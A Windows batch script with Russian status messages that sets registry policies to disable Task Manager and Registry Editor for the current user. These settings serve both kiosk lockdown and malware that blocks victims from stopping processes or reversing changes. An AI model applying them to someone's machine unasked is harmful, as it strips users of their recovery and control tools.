@ECHO OFF

REM 
REG QUERY "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    ECHO Создаем ветку Policies\System
    REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /f
)

REM 
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

IF %ERRORLEVEL%==0 (
    ECHO Диспетчер задач успешно заблокирован.
) ELSE (
    ECHO Ошибка при блокировке. Убедитесь, что у вас есть права администратора.
)

REM Проверяем, существует ли ветка Policies\System
REG QUERY "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    ECHO Создаем ветку Policies\System
    REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /f
)

REM Устанавливаем параметр DisableRegistryTools
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f

IF %ERRORLEVEL%==0 (
    ECHO Редактор реестра успешно отключен.
) ELSE (
    ECHO Ошибка при отключении. Убедитесь, что у вас есть права администратора.
)

PAUSE
